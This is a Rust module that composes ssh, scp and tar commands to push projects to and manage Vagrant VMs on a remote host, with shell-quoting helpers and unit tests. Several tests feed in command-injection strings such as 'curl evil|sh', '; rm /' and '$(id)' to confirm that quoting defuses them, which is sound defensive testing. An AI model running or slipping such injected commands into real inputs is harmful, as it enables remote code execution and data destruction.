//! Building the commands that drive Vagrant on the VM host.
//!
//! Every operation is a plain `ssh`, `scp` or `tar`
//! invocation. Nothing here runs a process: these functions
//! return the argv to run, which keeps the interesting logic
//! (quoting, paths, command composition) unit-testable
//! without a VM host.

pub mod probe;

use std::fmt;
use std::path::{Path, PathBuf};

use crate::config::Config;

/// A command to execute: a program, its arguments, and
/// optionally the directory to run it in.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RemoteCommand {
    /// Program to run, e.g. `ssh`.
    pub program: String,
    /// Arguments passed to the program.
    pub args: Vec<String>,
    /// Directory to run the program in.
    ///
    /// Used for `tar` and `scp` so they can be given a bare
    /// archive file name -- see [`PushArchive`].
    pub dir: Option<PathBuf>,
}

impl RemoteCommand {
    /// Creates a command from a program and its arguments.
    #[must_use]
    pub fn new(program: &str, args: &[&str]) -> Self {
        Self {
            program: program.to_owned(),
            args: args.iter().map(|a| (*a).to_owned()).collect(),
            dir: None,
        }
    }

    /// Sets the directory the command runs in.
    #[must_use]
    pub fn in_dir(mut self, dir: &Path) -> Self {
        self.dir = Some(dir.to_path_buf());
        self
    }
}

/// Renders a command for `--dry-run`.
///
/// The output is genuine shell: an argument is printed bare
/// only when every character is unambiguous, and otherwise
/// double-quoted with `\`, `"`, `$` and backtick escaped. A
/// reader can therefore tell where each argument begins and
/// ends, and pasting the line runs the same thing bombyx
/// would have run.
impl fmt::Display for RemoteCommand {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        if let Some(dir) = &self.dir {
            write!(f, "cd {} && ", display_arg(&dir.to_string_lossy()))?;
        }
        f.write_str(&self.program)?;
        for arg in &self.args {
            write!(f, " {}", display_arg(arg))?;
        }
        Ok(())
    }
}

/// Characters that carry no shell meaning, so an argument
/// made only of them needs no quoting when echoed.
fn is_plain(c: char) -> bool {
    c.is_ascii_alphanumeric()
        || matches!(
            c,
            '.' | '_' | '-' | '/' | '@' | ':' | '=' | ',' | '+' | '~'
        )
}

/// Renders one argument for display, quoting when needed.
fn display_arg(arg: &str) -> String {
    if !arg.is_empty() && arg.chars().all(is_plain) {
        return arg.to_owned();
    }
    let mut out = String::with_capacity(arg.len() + 2);
    out.push('"');
    for c in arg.chars() {
        if matches!(c, '"' | '\\' | '$' | '`') {
            out.push('\\');
        }
        out.push(c);
    }
    out.push('"');
    out
}

/// Wraps a string in single quotes for a POSIX shell.
///
/// Embedded single quotes are closed, escaped and reopened,
/// which is the only sequence a POSIX shell accepts inside a
/// single-quoted string.
#[must_use]
pub fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// Quotes a path for a POSIX shell while preserving a leading
/// `~`.
///
/// This exists because the two obvious options are both
/// wrong. Leaving the path unquoted allows injection; quoting
/// the whole path suppresses tilde expansion, because a POSIX
/// shell does **not** expand `~` inside single quotes -- so
/// `mkdir -p '~/vms/myproject'` silently creates a directory
/// literally named `~` in the home directory.
///
/// The fix is to leave only the tilde outside the quotes:
/// `~/'vms/myproject'`. Everything an attacker could influence
/// stays quoted, and the shell still expands the home
/// directory.
#[must_use]
pub fn quote_remote_path(path: &str) -> String {
    if path == "~" {
        return "~".to_owned();
    }
    match path.strip_prefix("~/") {
        Some("") => "~/".to_owned(),
        Some(rest) => format!("~/{}", shell_quote(rest)),
        None => shell_quote(path),
    }
}

/// Where the transient push archive lives on each end.
///
/// The archive is written into `dir`, and `tar` and `scp` are
/// both run *in* `dir` and given the bare `name`. That is
/// deliberate: on Windows an absolute path starts with a
/// drive letter (`C:\Users\...`), and `scp` reads everything
/// before the first colon as a *host name*, so passing the
/// absolute path would make it try to connect to a host
/// called `C`.
///
/// On the VM host the archive lands in the login directory
/// under the same bare name. Keeping the remote target free
/// of directories and metacharacters avoids depending on
/// whether a given `scp` build expands the remote path
/// through a shell (pre-9.0, and `-O`) or over SFTP (9.0+),
/// which quote incompatibly.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PushArchive {
    /// Local directory holding the archive.
    pub dir: PathBuf,
    /// Archive file name, used unchanged on both ends.
    pub name: String,
}

impl PushArchive {
    /// Builds an archive descriptor in `dir`, named uniquely
    /// for this run.
    ///
    /// `unique` distinguishes concurrent runs: two pushes
    /// sharing one name would race, and one could ship a
    /// different project's tree or delete the other's archive
    /// mid-transfer.
    #[must_use]
    pub fn new(dir: &Path, unique: &str) -> Self {
        Self {
            dir: dir.to_path_buf(),
            name: format!(".bombyx-push-{unique}.tar.gz"),
        }
    }
}

/// Builds the remote script that enters `dir` and runs
/// `vagrant` with `args`.
fn vagrant_script(dir: &str, args: &[&str]) -> String {
    let mut script = format!("cd {} && vagrant", quote_remote_path(dir));
    for arg in args {
        script.push(' ');
        script.push_str(&shell_quote(arg));
    }
    script
}

/// Builds an `ssh` command running `vagrant` in `dir` on the
/// VM host.
#[must_use]
pub fn vagrant_in(cfg: &Config, dir: &str, args: &[&str]) -> RemoteCommand {
    let script = vagrant_script(dir, args);
    RemoteCommand::new("ssh", &[&cfg.host, &script])
}

/// Builds an `ssh` command running `vagrant` in the project
/// directory on the VM host.
#[must_use]
pub fn vagrant(cfg: &Config, args: &[&str]) -> RemoteCommand {
    vagrant_in(cfg, &cfg.remote_project_dir(), args)
}

/// Builds the commands that push a local directory's
/// **contents** into `remote_dir` on the VM host.
///
/// The repo stays the source of truth; the host receives a
/// copy before every boot so the two cannot drift.
///
/// This ships a tar archive rather than using `scp -r` or
/// `rsync`, for two reasons:
///
/// - `scp -r <dir> host:<dest>/` copies *into* an existing
///   destination, like `cp -r`. The first push creates
///   `<dest>/<dir>`; the second creates
///   `<dest>/<dir>/<dir>`. Extracting a tar over an
///   existing tree instead overwrites in place, so
///   repeated pushes are idempotent.
/// - `rsync` is not present on a stock Windows workstation,
///   which is where bombyx runs. `tar`, `scp` and `ssh` all
///   are.
///
/// `.vagrant/` holds the VM's identity on the host and is
/// excluded from the archive, so a developer who has ever run
/// `vagrant` locally cannot overwrite the host's copy and
/// orphan a running VM. `.git/` is excluded because there is
/// no reason to ship it.
///
/// The tradeoff of extract-in-place is that a file deleted
/// locally is not removed from the host; run `vagrant
/// destroy` and re-push if the remote tree needs pruning.
#[must_use]
pub fn push_dir(
    cfg: &Config,
    local_dir: &Path,
    remote_dir: &str,
    archive: &PushArchive,
) -> Vec<RemoteCommand> {
    let remote_archive = quote_remote_path(&format!("~/{}", archive.name));
    // Cleanup runs whether or not the extract succeeded: a
    // half-written archive left in the project directory
    // would be swept into the tree `vagrant up` runs in.
    let unpack = format!(
        "{{ cd {dir} && tar -xzf {a}; }}; rc=$?; rm -f {a}; exit $rc",
        dir = quote_remote_path(remote_dir),
        a = remote_archive,
    );
    let local = local_dir.to_string_lossy().into_owned();
    let dest = format!("{}:{}", cfg.host, archive.name);
    vec![
        // `-C <dir> .` archives the contents, not the
        // directory itself, so extraction lands files
        // directly in `remote_dir`.
        RemoteCommand::new(
            "tar",
            &[
                "-czf",
                &archive.name,
                "-C",
                &local,
                "--exclude=./.vagrant",
                "--exclude=./.git",
                ".",
            ],
        )
        .in_dir(&archive.dir),
        RemoteCommand::new("scp", &[&archive.name, &dest]).in_dir(&archive.dir),
        RemoteCommand::new("ssh", &[&cfg.host, &unpack]),
    ]
}

/// Builds the `ssh` command that creates `dir` on the VM
/// host if it does not yet exist.
#[must_use]
pub fn ensure_dir(cfg: &Config, dir: &str) -> RemoteCommand {
    let script = format!("mkdir -p {}", quote_remote_path(dir));
    RemoteCommand::new("ssh", &[&cfg.host, &script])
}

/// Builds the `ssh` command that destroys the VM defined in
/// `dir`, doing nothing when there is no Vagrantfile there.
///
/// The guard makes teardown idempotent. A bare
/// `vagrant destroy -f` exits non-zero in a directory with no
/// Vagrantfile, which an interrupted first push leaves behind,
/// and that failure would stop the removal step that follows.
#[must_use]
pub fn destroy_vm_if_present(cfg: &Config, dir: &str) -> RemoteCommand {
    let script = format!(
        "cd {dir} && if [ -f Vagrantfile ]; then vagrant destroy -f; fi",
        dir = quote_remote_path(dir),
    );
    RemoteCommand::new("ssh", &[&cfg.host, &script])
}

/// Builds the `ssh` command that recursively removes `dir` on
/// the VM host.
///
/// This is the widest-reaching command bombyx emits: its blast
/// radius is bounded by a path rather than by Vagrant's notion
/// of a machine. Nothing is checked here, deliberately --
/// `Config::validate` rejects a `remote_root` that is
/// unrooted, contains a `.` or `..` segment, or is too shallow,
/// so every path derived from a loaded `Config` is already at
/// least two real segments deep. Validating once at the layer
/// that owns `remote_root` is what keeps the write path
/// (`mkdir`, `tar -xzf`) and this removal path agreeing about
/// which roots are usable.
///
/// The `debug_assert` catches a caller that builds a path some
/// other way; it is not the safety mechanism.
#[must_use]
pub fn remove_dir(cfg: &Config, dir: &str) -> RemoteCommand {
    debug_assert!(
        crate::config::path_segments(dir).len() >= 2,
        "remove_dir given a path shallower than Config permits: {dir:?}"
    );
    let script = format!("rm -rf {}", quote_remote_path(dir));
    RemoteCommand::new("ssh", &[&cfg.host, &script])
}

/// Builds the `ssh` command that opens an interactive shell
/// inside the project's VM.
///
/// `-t` forces a TTY, which `vagrant ssh` needs when invoked
/// through a non-interactive SSH command.
#[must_use]
pub fn shell_into_vm(cfg: &Config) -> RemoteCommand {
    let script = vagrant_script(&cfg.remote_project_dir(), &["ssh"]);
    RemoteCommand::new("ssh", &["-t", &cfg.host, &script])
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::name::ScratchName;

    fn cfg() -> Config {
        Config::for_tests()
    }

    fn archive() -> PushArchive {
        PushArchive::new(Path::new("/work"), "42")
    }

    fn push() -> Vec<RemoteCommand> {
        push_dir(
            &cfg(),
            Path::new("/repo/vagrant"),
            "~/vms/myproject",
            &archive(),
        )
    }

    #[test]
    fn quotes_a_plain_value() {
        assert_eq!(shell_quote("myproject"), "'myproject'");
    }

    #[test]
    fn quotes_a_value_containing_spaces() {
        assert_eq!(shell_quote("two words"), "'two words'");
    }

    #[test]
    fn escapes_embedded_single_quotes() {
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
    }

    #[test]
    fn quotes_an_empty_value() {
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn quotes_a_value_that_is_only_quotes() {
        assert_eq!(shell_quote("'"), r"''\'''");
    }

    #[test]
    fn quoting_neutralises_expansion_and_substitution() {
        assert_eq!(shell_quote("$HOME"), "'$HOME'");
        assert_eq!(shell_quote("`id`"), "'`id`'");
        assert_eq!(shell_quote(r"a\b"), r"'a\b'");
        assert_eq!(shell_quote("a\nb"), "'a\nb'");
    }

    #[test]
    fn remote_path_keeps_a_leading_tilde_unquoted() {
        // The whole point: `'~/vms'` is a literal `~`
        // directory, not the home directory.
        assert_eq!(quote_remote_path("~/vms/myproject"), "~/'vms/myproject'");
    }

    #[test]
    fn remote_path_passes_a_bare_tilde_through() {
        assert_eq!(quote_remote_path("~"), "~");
        assert_eq!(quote_remote_path("~/"), "~/");
    }

    #[test]
    fn remote_path_quotes_an_absolute_path_entirely() {
        assert_eq!(quote_remote_path("/srv/vms"), "'/srv/vms'");
    }

    #[test]
    fn remote_path_quotes_injection_after_the_tilde() {
        assert_eq!(
            quote_remote_path("~/vms; curl evil|sh"),
            r"~/'vms; curl evil|sh'"
        );
    }

    #[test]
    fn remote_path_does_not_expand_a_non_leading_tilde() {
        assert_eq!(quote_remote_path("/srv/~igor"), "'/srv/~igor'");
    }

    #[test]
    fn builds_a_vagrant_command() {
        let c = vagrant(&cfg(), &["up"]);
        assert_eq!(c.program, "ssh");
        assert_eq!(c.args[0], "vmhost");
        assert_eq!(c.args[1], "cd ~/'vms/myproject' && vagrant 'up'");
    }

    #[test]
    fn builds_a_vagrant_command_with_several_args() {
        let c = vagrant(&cfg(), &["snapshot", "restore", "fresh-install"]);
        assert_eq!(
            c.args[1],
            "cd ~/'vms/myproject' && vagrant 'snapshot' 'restore' \
             'fresh-install'"
        );
    }

    #[test]
    fn builds_a_scratch_command() {
        let cfg = cfg();
        let name = ScratchName::parse("pr-1234").unwrap();
        let c = vagrant_in(
            &cfg,
            &cfg.remote_scratch_dir(&name),
            &["destroy", "-f"],
        );
        assert_eq!(
            c.args[1],
            "cd ~/'vms/scratch/myproject/pr-1234' && vagrant \
             'destroy' '-f'"
        );
    }

    #[test]
    fn push_emits_exactly_three_steps_in_order() {
        let cmds = push();
        let programs: Vec<&str> =
            cmds.iter().map(|c| c.program.as_str()).collect();
        assert_eq!(programs, vec!["tar", "scp", "ssh"]);
    }

    #[test]
    fn push_archives_contents_not_the_directory() {
        // `-C <dir> .` is what makes the push idempotent:
        // archiving the directory itself would nest it one
        // level deeper on every push.
        assert_eq!(
            push()[0].args,
            vec![
                "-czf",
                ".bombyx-push-42.tar.gz",
                "-C",
                "/repo/vagrant",
                "--exclude=./.vagrant",
                "--exclude=./.git",
                "."
            ]
        );
    }

    #[test]
    fn push_excludes_the_hosts_vm_identity() {
        // Shipping a local `.vagrant/` overwrites the host's
        // machine id and orphans the running VM.
        assert!(
            push()[0].args.iter().any(|a| a == "--exclude=./.vagrant"),
            "the push must not carry a local .vagrant/"
        );
    }

    #[test]
    fn push_runs_tar_and_scp_in_the_archive_dir() {
        // Both must use the bare file name, or an absolute
        // Windows path makes scp read `C:` as a host name.
        let cmds = push();
        let dir = Some(PathBuf::from("/work"));
        assert_eq!(cmds[0].dir, dir);
        assert_eq!(cmds[1].dir, dir);
        assert_eq!(cmds[2].dir, None);
    }

    #[test]
    fn push_never_passes_a_drive_letter_to_scp() {
        let archive = PushArchive::new(
            Path::new(r"C:\Users\igor\AppData\Local\Temp"),
            "42",
        );
        let cmds = push_dir(
            &cfg(),
            Path::new("/repo/vagrant"),
            "~/vms/myproject",
            &archive,
        );
        for arg in &cmds[1].args {
            assert!(
                !arg.contains(r":\"),
                "scp argument {arg:?} carries a drive letter"
            );
        }
    }

    #[test]
    fn push_copies_the_archive_to_the_remote_home() {
        assert_eq!(
            push()[1].args,
            vec![".bombyx-push-42.tar.gz", "vmhost:.bombyx-push-42.tar.gz"]
        );
    }

    #[test]
    fn push_removes_the_archive_even_when_extraction_fails() {
        // `&&`-chaining the cleanup would leave a corrupt
        // archive inside the tree `vagrant up` runs in.
        assert_eq!(
            push()[2].args[1],
            "{ cd ~/'vms/myproject' && tar -xzf \
             ~/'.bombyx-push-42.tar.gz'; }; rc=$?; rm -f \
             ~/'.bombyx-push-42.tar.gz'; exit $rc"
        );
    }

    #[test]
    fn push_never_uses_scp_recursive() {
        // Regression guard: `scp -r` into an existing
        // destination nests the directory on every push.
        for c in &push() {
            assert!(
                !(c.program == "scp" && c.args.iter().any(|a| a == "-r")),
                "push must not use scp -r"
            );
        }
    }

    #[test]
    fn push_targets_the_dir_vagrant_runs_in() {
        // The Vagrantfile must land where `vagrant up` runs,
        // otherwise the boot fails with no Vagrantfile.
        let cfg = cfg();
        let dir = cfg.remote_project_dir();
        let cmds = push_dir(&cfg, Path::new("/repo/vagrant"), &dir, &archive());
        let quoted = quote_remote_path(&dir);
        assert!(cmds[2].args[1].contains(&format!("cd {quoted} &&")));
        assert!(
            vagrant(&cfg, &["up"]).args[1]
                .starts_with(&format!("cd {quoted} &&"))
        );
    }

    #[test]
    fn push_archive_name_is_unique_per_run() {
        let a = PushArchive::new(Path::new("/work"), "1-2");
        let b = PushArchive::new(Path::new("/work"), "3-4");
        assert_ne!(a.name, b.name);
        assert_eq!(a.name, ".bombyx-push-1-2.tar.gz");
    }

    #[test]
    fn ensure_dir_keeps_the_tilde_expandable() {
        let c = ensure_dir(&cfg(), "~/vms/scratch/pr-1");
        assert_eq!(c.args[1], "mkdir -p ~/'vms/scratch/pr-1'");
    }

    #[test]
    fn ensure_dir_quotes_an_absolute_dir() {
        let c = ensure_dir(&cfg(), "/srv/vms/p");
        assert_eq!(c.args[1], "mkdir -p '/srv/vms/p'");
    }

    #[test]
    fn remove_dir_quotes_the_path_and_keeps_the_tilde() {
        let c = remove_dir(&cfg(), "~/vms/myproject");
        assert_eq!(c.program, "ssh");
        assert_eq!(c.args[0], "vmhost");
        assert_eq!(c.args[1], "rm -rf ~/'vms/myproject'");
    }

    #[test]
    fn remove_dir_removes_an_absolute_path() {
        let c = remove_dir(&cfg(), "/srv/vms/myproject");
        assert_eq!(c.args[1], "rm -rf '/srv/vms/myproject'");
    }

    #[test]
    fn remove_dir_quotes_injection_in_the_path() {
        // Config rejects these characters, so this is the
        // second line of defence rather than the first.
        let c = remove_dir(&cfg(), "~/vms/a b; rm /");
        assert_eq!(c.args[1], "rm -rf ~/'vms/a b; rm /'");
    }

    #[test]
    fn destroy_tolerates_a_directory_with_no_vagrantfile() {
        // An interrupted first push leaves the directory made
        // but empty. A bare `vagrant destroy -f` fails there,
        // and would stop the removal that follows.
        let c = destroy_vm_if_present(&cfg(), "~/vms/myproject");
        assert_eq!(
            c.args[1],
            "cd ~/'vms/myproject' && if [ -f Vagrantfile ]; then \
             vagrant destroy -f; fi"
        );
    }

    #[test]
    fn vagrant_in_runs_in_the_given_dir() {
        let c = vagrant_in(&cfg(), "/srv/x", &["halt"]);
        assert_eq!(c.args[1], "cd '/srv/x' && vagrant 'halt'");
    }

    #[test]
    fn shell_into_vm_forces_a_tty() {
        let c = shell_into_vm(&cfg());
        assert_eq!(c.args[0], "-t");
        assert_eq!(c.args[1], "vmhost");
        assert_eq!(c.args[2], "cd ~/'vms/myproject' && vagrant 'ssh'");
    }

    #[test]
    fn displays_a_plain_command_unquoted() {
        let c = RemoteCommand::new("scp", &["a.tgz", "vmhost:a.tgz"]);
        assert_eq!(c.to_string(), "scp a.tgz vmhost:a.tgz");
    }

    #[test]
    fn displays_a_spaced_argument_quoted() {
        let c = RemoteCommand::new("ssh", &["vmhost", "cd x && vagrant up"]);
        assert_eq!(c.to_string(), "ssh vmhost \"cd x && vagrant up\"");
    }

    #[test]
    fn display_escapes_what_a_shell_would_expand() {
        // A dry run is the review step, so its output must
        // not read as something other than what will run.
        let c = RemoteCommand::new("ssh", &["h", "a $(id) `id` \"q\" \\"]);
        assert_eq!(c.to_string(), r#"ssh h "a \$(id) \`id\` \"q\" \\""#);
    }

    #[test]
    fn display_quotes_an_empty_argument() {
        let c = RemoteCommand::new("ssh", &[""]);
        assert_eq!(c.to_string(), "ssh \"\"");
    }

    #[test]
    fn display_shows_the_working_directory() {
        let c = RemoteCommand::new("tar", &["-czf", "a.tgz"])
            .in_dir(Path::new("/work"));
        assert_eq!(c.to_string(), "cd /work && tar -czf a.tgz");
    }
}
